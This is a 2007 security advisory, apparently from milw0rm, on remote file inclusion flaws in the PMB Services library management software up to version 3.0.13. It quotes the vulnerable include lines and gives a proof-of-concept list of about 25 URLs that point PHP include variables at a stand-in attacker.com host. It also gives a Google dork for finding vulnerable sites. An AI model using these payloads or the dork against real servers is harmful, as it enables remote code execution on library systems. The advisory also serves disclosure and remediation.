@@ -1,0 +1,219 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_68$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_68$2007] PMB Services <= 3.0.13 Multiple Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : March, 9th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv68-K-159-2007.txt
+Critical Lvl   : Dangerous
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : PMB Services 
+version       : <= 3.0.13
+Vendor        : http://www.sigb.net/
+Description :
+
+PMB is a completely free ILS (Integrated Library management System). The domain of software for libraries is almost exclusively occupied by proprietary products.
+We are some librarians, users and developers deploring this state of affairs.
+
+PMB is based on web technology. This is what we sometimes call a 'web-app'.
+PMB requires an HTTP server (such as Apache, but this is not an obligation), the MySQL database and the PHP language.
+
+The main functions of PMB are :
+
+    * Supporting the UNIMARC format
+    * Authorities management (authors, publishers, series, subjects...)
+    * Management of loans, holds, borrowers...
+    * A user-friendly configuration
+    * The ability to import full bibliographic records
+    * A user-friendly OPAC integrating a browser
+    * Loans management with a module designed to serve even the very small establishments
+    * Serials management
+    * Simple administration procedures that can be handled easily even by the library staff...
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+- Invalid include function at includes/resa_func.inc.php :
+
+---------------includes/resa_func.inc.php--------------------------------------
+<?php
+// +-------------------------------------------------+
+// © 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)
+// +-------------------------------------------------+
+// $Id: resa_func.inc.php,v 1.49 2006/10/31 07:59:35 touraine37 Exp $
+
+require_once("$class_path/quotas.class.php");
+...
+------------------------------------------------------------------
+
+- Invalid include function at includes/bull_info.inc.php :
+
+--------------includes/bull_info.inc.php--------------------------------------
+<?php
+// +-------------------------------------------------+
+// © 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)
+// +-------------------------------------------------+
+// $Id: bull_info.inc.php,v 1.23 2006/08/29 20:33:32 touraine37 Exp $
+
+// affichage des infos bulletin
+
+require_once($include_path."/resa_func.inc.php");
+...
+--------------------------------------------------------------------
+
+- Invalid include function at includes/misc.inc.php :
+
+---------------includes/misc.inc.php-------------------------------------
+<?php
+// +-------------------------------------------------+
+// © 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)
+// +-------------------------------------------------+
+// $Id: misc.inc.php,v 1.46 2006/10/18 17:06:28 dbellamy Exp $
+
+// ----------------------------------------------------------------------------
+//	fonctions de formatage de cha.ne
+// ----------------------------------------------------------------------------
+// reg_diacrit : fonction pour traiter les caractres accentu.s en recherche avec regex
+
+// choix de la classe ? utiliser pour envoi en pdf
+if (!$fpdf) {
+	if ($charset != 'utf-8') $fpdf = 'FPDF'; else $fpdf = 'UFPDF';
+}
+
+require_once($include_path."/marc_tables/".$lang."/empty_words");
+
+...
+------------------------------------------------------------------
+
+- Invalid include function at opac_css/rec_panier.php:
+
+-------------opac_css/rec_panier.php------------------------------
+<?php
+// +-------------------------------------------------+
+// © 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)
+// +-------------------------------------------------+
+// $Id: rec_panier.php,v 1.5 2006/12/10 10:04:10 touraine37 Exp $
+
+require_once($base_path.'/includes/session.inc.php');
+
+?>
+-----------------------------------------------------------------
+
+- - Invalid include function at opac_css/includes/author_see.inc.php :
+
+--------------------opac_css/includes/author_see.inc.php------------------------
+<?php
+// +-------------------------------------------------+
+// © 2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)
+// +-------------------------------------------------+
+// $Id: author_see.inc.php,v 1.32 2006/12/29 16:10:04 touraine37 Exp $
+
+// affichage du detail pour un auteur
+
+require_once($base_path.'/includes/templates/author.tpl.php');
+...
+----------------------------------------------------------------
+
+
+Variables $class_path $include_path and $base_path are not properly sanitized.
+When register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.
+
+also affected files :
+
+includes/options/options_date_box.php
+includes/options/options_file_box.php
+includes/options/options_list.php
+includes/options/options_query_list.php
+includes/options/options_text.php
+includes/options_empr/options.php
+includes/options_empr/options_comment.php
+includes/options_empr/options_date_box.php
+includes/options_empr/options_list.php
+includes/options_empr/options_query_list.php
+includes/options_empr/options_text.php
+admin/import/iimport_expl.php
+admin/netbase/clean.php
+admin/notices/perso.inc.php
+admin/quotas/main.inc.php
+admin/param/param_func.inc.php
+admin/sauvegarde/lieux.inc.php
+autorites.php
+acount.php
+cart.php
+edit.php
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/[PMB_path]/includes/resa_func.inc.php?class_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/bull_info.inc.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options/options_date_box.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options/options_file_box.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options/options_list.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options/options_query_list.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options/options_text.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options_empr/options.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options_empr/options_comment.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options_empr/options_date_box.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options_empr/options_list.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options_empr/options_query_list.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/includes/options_empr/options_text.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/admin/import/iimport_expl.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/admin/netbase/clean.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/admin/notices/perso.inc.php?class_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/admin/quotas/main.inc.php?class_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/admin/param/param_func.inc.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/admin/sauvegarde/lieux.inc.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/opac_css/rec_panier.php?base_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/opac_css/includes/author_see.inc.php?base_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/autorites.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/account.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/cart.php?include_path=http://attacker.com/evil?
+http://www.target.com/[PMB_path]/edit.php?include_path=http://attacker.com/evil?
+
+Google Dork :   " allinurl:opac_css " or "allinurl:pmb/opac_css" or "PMB opac_css"
+~~~~~~
+
+Solution:
+~~~~~~
+
+- Sanitize variable $class_dir $include_path and $base_path on affected files.
+- Turn off register_globals
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, and my little son, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-03-09]
